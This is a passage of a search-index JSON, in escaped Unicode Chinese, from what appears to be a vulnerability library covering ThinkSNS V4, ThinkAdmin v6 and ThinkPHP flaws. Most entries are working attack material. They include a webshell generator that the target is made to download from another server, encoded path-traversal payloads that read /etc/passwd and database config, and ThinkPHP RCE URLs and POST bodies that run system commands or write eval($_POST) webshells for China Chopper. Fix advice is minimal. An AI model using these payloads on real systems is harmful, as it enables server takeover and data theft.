\u66f4\u65b0\u65f6\u95f4\uff1a2017-09-13\n\n\u7a0b\u5e8f\u6e90\u7801\u4e0b\u8f7d\uff1ahttp://www.thinksns.com/experience.html\uff08\u586b\u5199\u4fe1\u606f\u540e\uff0c\u63d0\u4ea4\u5e76\u4e0b\u8f7d\u4ee3\u7801\uff09\n\n\u9ed8\u8ba4\u540e\u53f0\u5730\u5740\uff1ahttp://127.0.0.1/index.php?app=admin&amp;mod=Public&amp;act=login\n\n\u9ed8\u8ba4\u7528\u6237\u5bc6\u7801\uff1a\u7ba1\u7406\u5458\u5e10\u53f7: admin@admin.com \u5bc6\u7801\u81ea\u8bbe\uff0c\u5927\u4e8e6\u4f4d\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/ThinkSNS/ThinkSNS_V4/#code-analysis","title":"Code analysis","text":"<p>\u5b58\u5728\u6f0f\u6d1e\u4ee3\u7801<code>\\ts4\\apps\\admin\\Lib\\Action\\UpgradeAction.class.php</code>\u4e2d\u7684\u4e00\u4e2a\u51fd\u6570\u4e2d\u3002</p> <pre><code>public function step1()\n{\n    $downUrl = $_GET['upurl'];\n    $downUrl = urldecode($downUrl);\n    $path = DATA_PATH.'/'.'upgrade/'.basename($downUrl);\n\n    // # \u5907\u4efd\u8001\u914d\u7f6e\u6587\u4ef6\n    $oldConf = file_get_contents(CONF_PATH.'/thinksns.conf.php');\n    file_put_contents(DATA_PATH.'/old.thinksns.conf.php', $oldConf);\n\n    // # \u4e0b\u8f7d\u589e\u91cf\u5305\n    is_dir(dirname($path)) or mkdir(dirname($path), 0777, true);\n    file_put_contents($path, file_get_contents($downUrl));\n    file_exists($path) or $this-&gt;showError('\u4e0b\u8f7d\u5347\u7ea7\u5305\u5931\u8d25\uff0c\u8bf7\u68c0\u67e5'.dirname($path).'\u76ee\u5f55\u662f\u5426\u53ef\u5199\uff0c\u5982\u679c\u53ef\u5199\uff0c\u8bf7\u5237\u65b0\u91cd\u8bd5\uff01');\n\n    // \u9a8c\u8bc1hash\u5224\u65ad\u5305\u662f\u5426\u5408\u6cd5\u3002\n    $filename = dirname($path).'/upgrade.json';\n    $data = file_get_contents($filename);\n    $data = json_decode($data, false);\n    if (md5_file($path) != $data-&gt;md5) {\n        $this-&gt;showError('\u66f4\u65b0\u5305\u6821\u9a8c\u5931\u8d25\uff0c\u8bf7\u91cd\u65b0\u6267\u884c\u5347\u7ea7.');\n    }\n</code></pre> <p>\u51fd\u6570</p> <pre><code>file_put_contents \u2014 \u5c06\u4e00\u4e2a\u5b57\u7b26\u4e32\u5199\u5165\u6587\u4ef6\nfile_get_contents \u2014 \u5c06\u6574\u4e2a\u6587\u4ef6\u8bfb\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32\n</code></pre> <p>\u5728\u8fd9\u6bb5\u51fd\u6570\u4e2d\uff0c\u5148\u5907\u4efd\u8001\u914d\u7f6e\u6587\u4ef6\uff0c\u7136\u540e\u4e0b\u8f7d\u589e\u91cf\u5305\uff0c\u4e0b\u8f7d\u53c2\u6570$downUrl\u672a\u7ecf\u8fc7\u4efb\u4f55\u5904\u7406\uff0c\u76f4\u63a5\u4e0b\u8f7d\u5230\u7f51\u7ad9\u76ee\u5f55\u4e0b\uff0c\u63a5\u7740\u9a8c\u8bc1hash\u5224\u65ad\u5305\u662f\u5426\u5408\u6cd5\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u5220\u9664\u4e0b\u8f7d\u7684\u589e\u91cf\u5305\uff0c \u5bfc\u81f4\u7a0b\u5e8f\u5728\u5b9e\u73b0\u4e0a\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u6f0f\u6d1e\uff0c\u4e0b\u8f7d\u8fdc\u7a0b\u6587\u4ef6\u5230\u7f51\u7ad9\u76ee\u5f55\u4e0b\uff0c\u653b\u51fb\u8005\u53ef\u6307\u5b9a\u7b2c\u4e09\u65b9url\u4e0b\u8f7d\u6076\u610f\u811a\u672c\u5230\u7f51\u7ad9\u76ee\u5f55\uff0c\u8fdb\u4e00\u6b65\u89e6\u53d1\u6076\u610f\u4ee3\u7801\uff0c\u63a7\u5236\u7f51\u7ad9\u670d\u52a1\u5668\u3002</p> <p>\u8fdc\u7a0b\u4e0b\u8f7d\u6587\u4ef6\uff0c\u5728\u53e6\u4e00\u4e2a\u670d\u52a1\u5668\u4e0a\u521b\u5efadoor.php\u3002</p> <pre><code>&lt;?php   \necho \"&lt;?php\";\necho \"eval(file_get_contents('php://input'));\";  \necho \"?&gt;\";  \n?&gt;\n</code></pre> <p>\u8fdc\u7a0b\u4e0b\u8f7d    </p> <p><code>http://127.0.0.1:8000/ts4/index.php?app=admin&amp;mod=Upgrade&amp;act=step1&amp;upurl=http://192.168.86.194:8000/door.php</code></p> <p>\u4f1a\u5728<code>ts4\\data\\upgrade</code>\u51fa\u73b0\u4e0b\u8f7d\u7684<code>door.php</code>\u6587\u4ef6\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/ThinkSNS/ThinkSNS_V4/#references","title":"References","text":"<p>ThinkSNS_V4 \u540e\u53f0\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u5bfc\u81f4Getshell</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkadmin/ThinkAdmin%20v6%20%E5%88%97%E7%9B%AE%E5%BD%95%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/","title":"ThinkAdmin v6 \u5217\u76ee\u5f55\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6","text":"<p>ThinkAdmin v6 \u5217\u76ee\u5f55\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6 V5\u524d\uff0c\u76f4\u63a5\u4e5f\u80fd\u8bfb\u53d6 \u5217\u76ee\u5f55 poc: version()\u53ef\u4ee5\u83b7\u53d6\u5230\u5f53\u524d\u7248\u672c\uff1a2020.08.03.01\uff0c\u2264\u8fd9\u4e2a\u7248\u672c\u7684\u90fd\u6709\u53ef\u80fd\u5b58\u5728\u6f0f\u6d1e http://think.admin/ThinkAdmin/public/admin.html?s=admin/api.Update/version \u8bfb\u53d6\u7f51\u7ad9\u6839\u76ee\u5f55Payload: http://think.admin/ThinkAdmin/public/admin.html?s=admin/api.Update/node post:rules=[\"/\"] \u4e5f\u53ef\u4ee5\u4f7f\u7528../\u6765\u8fdb\u884c\u76ee\u5f55\u7a7f\u8d8a-\u300b rules=[\"../../../\"] \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6 \u9700\u8981\u8fdb\u884cencode() \u52a0\u5bc6\u4e00\u4e0b\u5b57\u7b26\u4e32 On Windows read database.php payload:<code>database.php   =&gt;  public/static/../../config/database\"php /admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b2r33322u2x2v1b2s2p382p2q2p372t0y342w34</code>On Linux read /etc/passwd payload:<code>/admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b2t382r1b342p37373b2s</code></p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkadmin/Thinkadmin%20v6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-25540%EF%BC%89/","title":"Thinkadmin v6\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\uff08CVE-2020-25540\uff09","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkadmin/Thinkadmin%20v6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-25540%EF%BC%89/#_1","title":"\u6f0f\u6d1e\u4fe1\u606f:","text":"<p>ThinkAdmin\u662f\u4e00\u5957\u57fa\u4e8eThinkPHP\u6846\u67b6\u7684\u901a\u7528\u540e\u53f0\u7ba1\u7406\u7cfb\u7edf\u3002ThinkAdmin 6\u7248\u672c\u5b58\u5728\u8def\u5f84\u904d\u5386\u6f0f\u6d1e\u3002\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u901a\u8fc7GET\u8bf7\u6c42\u7f16\u7801\u53c2\u6570\u4efb\u610f\u8bfb\u53d6\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\u7684\u6587\u4ef6\u3002</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkadmin/Thinkadmin%20v6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-25540%EF%BC%89/#_2","title":"\u5f71\u54cd\u8303\u56f4:","text":"<p>Thinkadmin\u7248\u672c\u5c0f\u4e8e \u2264 2020.08.03.01</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkadmin/Thinkadmin%20v6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-25540%EF%BC%89/#_3","title":"\u6f0f\u6d1e\u590d\u73b0:","text":"<p>fofa_dork: \u201cThinkAdmin\u201d &amp;&amp; title\u201d\u7cfb\u7edf\u767b\u5f55 \u00b7 ThinkAdmin\u201d</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkadmin/Thinkadmin%20v6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-25540%EF%BC%89/#poc","title":"POC:","text":"<p>``` POST /admin.html?s=admin/api.Update/node HTTP/1.1 Host: xxxxxx Accept: / Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 22</p> <p>rules=%5B%22.%2F%22%5D  <code>![](https://www.bylibrary.cn/wp-content/uploads/2020/09/\u5fae\u4fe1\u56fe\u7247_20200921085600.jpg) \u83b7\u53d6\u7248\u672c\u4fe1\u606f:</code> https://xxxxx/admin.html?s=admin/api.Update/version  ```2\u3001\u2f42\u4ef6\u8bfb\u53d6,\u540e\u2faf\u90a3\u2f00\u4e32\u662fUTF8\u5b57\u7b26\u4e32\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u3002\u8ba1\u7b97\u2f45\u5f0f\u5728Update.php\u4e2d\u7684\u52a0\u5bc6\u51fd\u6570\u3002 /admin.html? s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b2r33322u2x2v1b2s2p382p2q2p372t0y342w34 </p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkadmin/Thinkadmin%20v6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-25540%EF%BC%89/#_4","title":"\u4fee\u590d\u65b9\u6848:","text":"<p>\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4fee\u590d\u76f8\u5173\u95ee\u9898\uff0c\u8bf7\u53d7\u5f71\u54cd\u7528\u6237\u5c3d\u5feb\u5347\u7ea7\u5230\u5b89\u5168\u7248\u672c</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/01-Thinkphp%E6%BC%8F%E6%B4%9E%E9%80%9F%E6%9F%A5/","title":"\u76ee\u5f55","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/01-Thinkphp%E6%BC%8F%E6%B4%9E%E9%80%9F%E6%9F%A5/#rce","title":"\u4e00\u3001\u63a7\u5236\u5668\u540d\u5f15\u8d77\u7684RCE","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/01-Thinkphp%E6%BC%8F%E6%B4%9E%E9%80%9F%E6%9F%A5/#requestsrce","title":"\u4e8c\u3001\u6838\u5fc3\u7c7bRequests\u5f15\u8d77\u7684RCE","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/01-Thinkphp%E6%BC%8F%E6%B4%9E%E9%80%9F%E6%9F%A5/#rce_1","title":"\u4e00\u3001\u63a7\u5236\u5668\u540d\u5f15\u8d77\u7684RCE","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/01-Thinkphp%E6%BC%8F%E6%B4%9E%E9%80%9F%E6%9F%A5/#_2","title":"\u516c\u5f00\u65f6\u95f4\uff1a","text":"<p>2018/12/09  </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/01-Thinkphp%E6%BC%8F%E6%B4%9E%E9%80%9F%E6%9F%A5/#_3","title":"\u5f71\u54cd\u7248\u672c\uff1a","text":"<p>ThinkPHP 5.0\u7cfb\u5217 &lt; 5.0.23 ThinkPHP 5.1\u7cfb\u5217 &lt; 5.1.31</p> <p>poc:  </p> <pre><code>http://127.0.0.1/tp5022/public/index.php?s=index/\\think\\app/invokefunction&amp;function=phpinfo&amp;vars[0]=1\n</code></pre> <p>exp:  </p> <pre><code>http://127.0.0.1/tp5022/public/index.php?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami\n</code></pre> <p>shell:  </p> <pre><code>http://127.0.0.1/tp5022/public/index.php?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=a.php&amp;vars[1][]=&lt;?php eval(@$_POST['a']);?&gt;#shell\u5730\u5740http://127.0.0.1/tp5022/public/a.php\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/01-Thinkphp%E6%BC%8F%E6%B4%9E%E9%80%9F%E6%9F%A5/#requestsrce_1","title":"\u4e8c\u3001\u6838\u5fc3\u7c7bRequests\u5f15\u8d77\u7684RCE","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/01-Thinkphp%E6%BC%8F%E6%B4%9E%E9%80%9F%E6%9F%A5/#_4","title":"\u516c\u5f00\u65f6\u95f4\uff1a","text":"<p>2019/01/11</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/01-Thinkphp%E6%BC%8F%E6%B4%9E%E9%80%9F%E6%9F%A5/#_5","title":"\u5f71\u54cd\u7248\u672c\uff1a","text":"<p>5.0\u5168\u7cfb\u5217\uff0c\u5177\u4f53\u5982\u4e0b  </p> <pre><code>\u7248\u672c\u540d  \u662f\u5426\u53ef\u88ab\u653b\u51fb  \u653b\u51fb\u6761\u4ef6\n5.0.0   \u5426           \u65e0\n5.0.1   \u5426           \u65e0\n5.0.2   \u5426           \u65e0\n5.0.3   \u5426           \u65e0\n5.0.4   \u5426           \u65e0\n5.0.5   \u5426           \u65e0\n5.0.6   \u5426           \u65e0\n5.0.7   \u5426           \u65e0\n5.0.8   \u662f           \u65e0\u9700\u5f00\u542fdebug\n5.0.9   \u662f           \u65e0\u9700\u5f00\u542fdebug\n5.0.10  \u662f           \u65e0\u9700\u5f00\u542fdebug\n5.0.11  \u662f           \u65e0\u9700\u5f00\u542fdebug\n5.0.12  \u662f           \u65e0\u9700\u5f00\u542fdebug\n5.0.13  \u662f           \u9700\u5f00\u542fdebug\n5.0.14  \u662f           \u9700\u5f00\u542fdebug\n5.0.15  \u662f           \u9700\u5f00\u542fdebug\n5.0.16  \u662f           \u9700\u5f00\u542fdebug\n5.0.17  \u662f           \u9700\u5f00\u542fdebug\n5.0.18  \u662f           \u9700\u5f00\u542fdebug\n5.0.19  \u662f           \u9700\u5f00\u542fdebug\n5.0.20  \u5426           \u65e0\n5.0.21  \u662f           \u9700\u5f00\u542fdebug\n5.0.22  \u662f           \u9700\u5f00\u542fdebug\n5.0.23  \u662f           \u9700\u5f00\u542fdebug\n5.0.24  \u5426           \u65e0\n</code></pre> <p>exp\uff1a  </p> <pre><code>\u7248\u672c\u53f7\uff1a5.0.8~5.0.19s=whoami&amp;_method=__construct&amp;filter&amp;filter=system\u7248\u672c\u53f7\uff1a5.0.20~5.0.23_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami\u6216_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=whoami\n</code></pre> <p>\u5177\u4f53\u8bf7\u6c42\u5305\u5982\u4e0b\uff0c\u7559\u610f\u4e0b<code>Content-Type: application/x-www-form-urlencoded</code> </p> <pre><code>POST /tp5022/public/ HTTP/1.1\nHost: 127.0.0.1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: think_var=zh-cn\nUpgrade-Insecure-Requests: 1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 65\n\n_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=whoami\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/ThinkPHP_3.2.3-5.0.10_%E7%BC%93%E5%AD%98%E5%87%BD%E6%95%B0%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7/","title":"ThinkPHP_3.2.3-5.0.10_\u7f13\u5b58\u51fd\u6570\u8bbe\u8ba1\u7f3a\u9677","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/ThinkPHP_3.2.3-5.0.10_%E7%BC%93%E5%AD%98%E5%87%BD%E6%95%B0%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7/#affected-version","title":"Affected Version","text":"<ul> <li>ThinkPHP_3.2.3-5.0.10</li> </ul>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/ThinkPHP_3.2.3-5.0.10_%E7%BC%93%E5%AD%98%E5%87%BD%E6%95%B0%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7/#poc","title":"PoC","text":"<p>\u8be5\u6f0f\u6d1e\u590d\u73b0\u8d77\u6765\u6bd4\u8f83\u590d\u6742\uff0c\u867d\u7136\u9700\u8981\u540c\u65f6\u6ee1\u8db3\u5f88\u591a\u6761\u4ef6\u624d\u53ef\u4ee5\u5bfc\u81f4GetShell\uff0c\u4e0d\u8fc7\u98ce\u9669\u786e\u5b9e\u5b58\u5728\uff0c\u5bf9\u4e8e\u9ed1\u5ba2\u6765\u8bf4\u4efb\u4f55\u4e00\u70b9\u7ec6\u5fae\u7684\u98ce\u9669\u90fd\u6709\u53ef\u80fd\u662f\u6574\u4e2a\u653b\u51fb\u94fe\u6761\u4e2d\u91cd\u8981\u7684\u4e00\u73af\u3002</p> <p>\u6839\u636e\u5148\u77e5\u8bba\u575b\u4e0adalao\u7684\u8ba8\u8bba\uff0c\u89e6\u53d1\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u81f3\u5c11\u9700\u8981\u540c\u65f6\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6\uff1a</p> <ul> <li> <ol> <li>\u5f00\u542f\u7f13\u5b58\u529f\u80fd</li> </ol> </li> <li> <ol> <li>\u7f13\u5b58\u6587\u4ef6\u6240\u5728\u76ee\u5f55\u53ef\u4ee5\u4ece\u6d4f\u89c8\u5668\u76f4\u63a5\u8bbf\u95ee</li> </ol> </li> <li> <ol> <li>\u9700\u8981\u80fd\u591f\u731c\u89e3\u51fa\u7f13\u5b58\u7684\u6587\u4ef6\u540d\uff08\u6587\u4ef6\u540d\u751f\u6210\u6709\u4e00\u5b9a\u89c4\u5f8b\uff09</li> </ol> </li> <li> <ol> <li>\u540c\u65f6\u53ef\u4ee5\u63a7\u5236\u7f13\u5b58\u6587\u4ef6\u91cc\u7684\u5185\u5bb9\uff08\u6bd4\u5982\u901a\u8fc7\u5199\u5165\u5230\u6570\u636e\u5e93\u8fdb\u800c\u751f\u6210\u7f13\u5b58\u6587\u4ef6\uff09</li> </ol> </li> </ul> <p>\u4e2a\u4eba\u5728\u590d\u73b0\u8fd9\u4e2a\u6f0f\u6d1e\u7684\u65f6\u5019\u53d1\u73b0 5.0.x \u7248\u672c\u7684 TP \u5e76\u4e0d\u80fd\u76f4\u63a5\u8bbf\u95ee\u5230\u7f13\u5b58\u6587\u4ef6\u6240\u5728\u7684\u76ee\u5f55\uff0c\u6240\u4ee5\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4e0d\u80fd\u89e6\u53d1\u8be5\u6f0f\u6d1e\u3002\u5728 3.2.x \u7248\u672c\u662f\u53ef\u4ee5\u76f4\u63a5\u4ece\u6d4f\u89c8\u5668\u8bbf\u95ee\u5230\u7f13\u5b58\u6587\u4ef6\u7684\u3002</p> <p>\u4e3a\u4e86\u89e6\u53d1TP 3.2.3 Demo \u7684 GetShell \u6f0f\u6d1e\uff0c\u5148\u53d1\u8d77\u5982\u4e0b\u8bf7\u6c42\uff1a</p> <p><code>http://localhost/tp3.2.3/index.php/Home/Index/get?id=%0D%0Aeval($_POST[x]);//</code></p> <p>\u4e0b\u4e00\u6b65\u9700\u8981\u5bf9\u7f13\u5b58\u7684\u6587\u4ef6\u540d\u8fdb\u884c\u731c\u89e3\uff0c\u6587\u4ef6\u540d\u7684\u751f\u6210\u89c4\u5219\u662f\u7f13\u5b58\u7684key\u7684MD5\uff0c\u6240\u4ee5\u9ed1\u76d2\u60c5\u51b5\u4e0b\u53ef\u4ee5\u5148\u7b97\u4e00\u4e9b\u5173\u952e\u8bcd\u7684MD5\uff0c\u7136\u540e\u6279\u91cfHEAD\u8bf7\u6c42\uff0c\u53d1\u73b0\u54cd\u5e94200\u5219\u8bf4\u660e\u5b58\u5728\u8fd9\u4e2a\u7f13\u5b58\u6587\u4ef6\uff0c\u6216\u8005\u7ed3\u5408\u6e90\u4ee3\u7801\u6cc4\u9732\u6f0f\u6d1e\u8fdb\u884c\u5229\u7528\uff0c\u5728\u8fd9\u91cc\u6211\u4eec\u76f4\u63a5\u4ece\u6e90\u7801\u6587\u4ef6\u770b\u5230\u751f\u6210\u7684\u6587\u4ef6\uff1a</p> <p></p> <p>\u6587\u4ef6\u540d \u4e5f\u6b63\u662f \u7f13\u5b58 key \uff08name\uff09 \u7684MD5 \u503c\uff1a</p> <p><code>md5(name,32) = b068931cc450442b63f5b3d276ea4297</code></p> <p>\u6700\u540e\uff0c\u53ef\u4ee5\u770b\u5230 b068931cc450442b63f5b3d276ea4297.php \u7684 \u5185\u5bb9\u4e3a\u4e4b\u524d\u5199\u8fdb\u53bb\u7684\u4e00\u53e5\u8bdd\u6728\u9a6c\uff1a</p> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/ThinkPHP_3.2.3-5.0.10_%E7%BC%93%E5%AD%98%E5%87%BD%E6%95%B0%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7/#references","title":"References","text":"<ol> <li>https://xianzhi.aliyun.com/forum/topic/99\uff08\u6f0f\u6d1e\u8be6\u60c5\uff09</li> <li>http://www.thinkphp.cn/topic/51162.html\uff08\u4fee\u590d\u65b9\u6848\uff09</li> </ol>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%202.X%20RCE%E6%BC%8F%E6%B4%9E/","title":"Thinkphp 2.X RCE\u6f0f\u6d1e","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%202.X%20RCE%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u8303\u56f4","text":"<p>Thinkphp 2.X</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%202.X%20RCE%E6%BC%8F%E6%B4%9E/#poc","title":"\u6f0f\u6d1ePOC","text":"<pre><code>/index.php?s=/index/index/xxx/${@phpinfo()}\n</code></pre> <pre><code>/index.php?s=/index/index/xxx/${@print(system($_POST[a]))}\n</code></pre> <p>\u83dc\u5200\u8fde\u63a5,\u5bc6\u7801\u4e3aa\u3002</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%202.X%20RCE%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","title":"Thinkphp 2.X RCE\u6f0f\u6d1e\u73af\u5883\u642d\u5efa","text":"","tags":["\u767d\u9601-\u73af\u5883\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%202.X%20RCE%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#docker","title":"\u5b89\u88c5docker\u73af\u5883","text":"","tags":["\u767d\u9601-\u73af\u5883\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%202.X%20RCE%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#_1","title":"\u70b9\u51fb\u67e5\u770b\u6559\u7a0b","text":"","tags":["\u767d\u9601-\u73af\u5883\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%202.X%20RCE%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#vulhub","title":"\u4e0b\u8f7dvulhub\u9879\u76ee","text":"<p>\u9879\u76ee\u5730\u5740\uff1ahttps://github.com/vulhub/vulhub</p> <p>\u4e0b\u8f7d\u540e\u8fdb\u5165\u9879\u76ee\u76ee\u5f55\u4e0bthinkphp/2-rce\u76ee\u5f55\uff1a</p> <pre><code>cd vunhub-master/thinkphp/2-rce\n</code></pre> <p>\u5f00\u542f\u672c\u6b21\u6f0f\u6d1e\u73af\u5883\uff1a</p> <pre><code>docker-compose up -d\n</code></pre> <p>\u6d4f\u89c8\u5668\u8bbf\u95ee\u73af\u5883\u670d\u52a1\u5668**ip:8080** </p>","tags":["\u767d\u9601-\u73af\u5883\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%202.X%20RCE%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#_2","title":"\u73af\u5883\u642d\u5efa\u5b8c\u6210\uff01","text":"","tags":["\u767d\u9601-\u73af\u5883\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%203.2.3%20%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/","title":"Thinkphp 3.2.3 \u7f13\u5b58\u6f0f\u6d1e","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%203.2.3%20%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/#_1","title":"\u5f71\u54cd\u8303\u56f4","text":"<p>Thinkphp 